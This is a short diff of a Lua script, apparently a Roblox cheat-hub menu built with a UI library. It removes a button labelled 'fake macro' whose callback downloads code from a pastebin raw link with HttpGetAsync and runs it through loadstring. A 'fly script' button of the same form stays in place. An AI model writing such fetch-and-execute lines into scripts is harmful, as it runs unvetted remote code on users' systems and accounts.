@@ -550,19 +550,6 @@ Callback = <function> - The function of the button.
 ]]
 
 Tab:AddButton({
-	Name = "fake macro",
-	Callback = function()
-      		print("thx")
-loadstring(game:HttpGetAsync("https://pastebin.com/raw/XiqsUXHj", true))()
-  	end    
-})
-
---[[
-Name = <string> - The name of the button.
-Callback = <function> - The function of the button.
-]]
-
-Tab:AddButton({
 	Name = "fly script",
 	Callback = function()
       		print("thx")
